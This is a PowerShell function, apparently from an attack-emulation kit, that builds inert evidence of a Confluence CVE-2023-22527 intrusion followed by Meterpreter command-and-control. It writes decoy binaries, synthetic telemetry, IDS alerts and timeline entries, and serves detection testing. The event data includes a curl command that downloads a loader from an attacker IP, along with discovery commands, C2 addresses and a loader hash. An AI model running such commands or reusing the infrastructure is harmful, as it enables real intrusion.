function Invoke-ElpacoConfluenceMeterpreter {
    param([Parameter(Mandatory)][System.Collections.IDictionary]$Paths)
    $time = Get-ElpacoTimeline

    $webEvents = @(
        [ordered]@{ timestamp = $time.Initial.ToString('o'); sourceIp = '45.227.254.124'; cve = 'CVE-2023-22527'; parent = 'tomcat9.exe'; child = 'cmd.exe /c whoami'; synthetic = $true },
        [ordered]@{ timestamp = $time.Meterpreter.ToString('o'); sourceIp = '91.191.209.46'; cve = 'CVE-2023-22527'; parent = 'tomcat9.exe'; child = 'curl.exe -o HAHLGiDDb.exe http://91.191.209.46/HAHLGiDDb.exe'; synthetic = $true },
        [ordered]@{ timestamp = $time.Day2.ToString('o'); sourceIp = '109.160.16.68'; child = 'cmd.exe /c whaomi'; attribution = 'uncertain secondary actor'; synthetic = $true },
        [ordered]@{ timestamp = $time.Day2.AddMinutes(10).ToString('o'); sourceIp = '185.228.19.244'; child = 'cmd.exe /c whoami'; synthetic = $true },
        [ordered]@{ timestamp = $time.Day2.AddMinutes(18).ToString('o'); sourceIp = '185.220.101.185'; child = 'cmd.exe /c whoami'; synthetic = $true }
    )
    Write-ElpacoEvidenceFile -Path (Join-Path $Paths.Evidence 'confluence-cve-2023-22527-events.json') -Content ($webEvents | ConvertTo-Json -Depth 7) -Purpose 'public-facing application exploit telemetry' -Timestamp $time.Initial

    $tomcat = Join-Path $Paths.Confluence 'tomcat9.exe'
    New-ElpacoBinaryDecoy -Path $tomcat -Role 'Confluence Tomcat process-name decoy'
    foreach ($command in @('whoami', 'dir c:\Users\', 'net localgroup Administrators', 'cmd.exe /c whaomi')) {
        Invoke-ElpacoDecoyProcess -FilePath $tomcat -ReportedCommandLine "tomcat9.exe -> cmd.exe /c $command"
    }

    $loaderHashes = @{
        'HAHLGiDDb.exe' = 'abbe5619e1d7a08f807b57d0949a7f97108a546a415778f25ed35f31ee2cd2f5'
        'RfHBBgXXYF.exe' = 'NOT-PUBLISHED'
        'ZqYeqEZtohD.exe' = 'NOT-PUBLISHED'
    }
    foreach ($name in $loaderHashes.Keys) {
        $loader = Join-Path $Paths.Temp $name
        New-ElpacoBinaryDecoy -Path $loader -Role 'Metasploit shellcode-loader filename canary' -ReportedSha256 $loaderHashes[$name]
        Invoke-ElpacoDecoyProcess -FilePath $loader -ReportedCommandLine "$name --reported-meterpreter-stage 91.191.209.46:12385 --actual-loopback 127.0.0.1:12385"
        Invoke-ElpacoLoopbackPort -Port 12385 -ReportedTarget '91.191.209.46:12385'
    }
    $pipes = @()
    foreach ($base in @('nbjlop', 'npixmw', 'cjlodi', 'wucnic')) {
        Write-ElpacoEvidenceFile -Path (Join-Path $Paths.Temp "$base.dll") -Content "MZ ELPACO INERT DLL CANARY: $base" -Purpose 'Meterpreter DLL-stage filename canary' -Timestamp $time.Meterpreter.AddMinutes(2)
        $pipes += [ordered]@{ dll = "$base.dll"; namedPipe = "\$base"; created = $false; note = 'Metadata only; no named pipe opened.' }
    }
    Write-ElpacoEvidenceFile -Path (Join-Path $Paths.Evidence 'meterpreter-dll-pipes.json') -Content ($pipes | ConvertTo-Json -Depth 5) -Purpose 'matching DLL and named-pipe evidence' -Timestamp $time.Meterpreter.AddMinutes(2)
    Write-ElpacoEvidenceFile -Path (Join-Path $Paths.Evidence 'suricata-events.json') -Content ((@(
        @{ sid = 2050543; signature = 'Atlassian Confluence RCE Attempt Observed (CVE-2023-22527) M2'; synthetic = $true },
        @{ sid = 2025644; signature = 'Possible Metasploit Payload Common Construct Bind_API'; destination = '127.0.0.1:12385'; reportedDestination = '91.191.209.46:12385'; synthetic = $true },
        @{ sid = 2027762; signature = 'AnyDesk Remote Desktop Software User-Agent'; destination = '127.0.0.1:443'; reportedDestination = '45.227.254.124:443'; synthetic = $true }
    ) | ConvertTo-Json -Depth 6)) -Purpose 'portable IDS alert canaries' -Timestamp $time.Meterpreter

    Add-ElpacoTimelineEvent -Timestamp $time.Initial -Phase 'Initial Access' -Event 'CVE-2023-22527 exploitation spawned discovery from the Confluence Tomcat process.' -Details @{ sourceIp = '45.227.254.124'; exploitation = 'synthetic only' }
    Add-ElpacoTimelineEvent -Timestamp $time.Meterpreter -Phase 'Command and Control' -Event 'Randomized loaders and matching DLL/pipe metadata represented the short Meterpreter sessions.' -Details @{ reportedC2 = '91.191.209.46:12385'; actualTarget = '127.0.0.1:12385' }
}
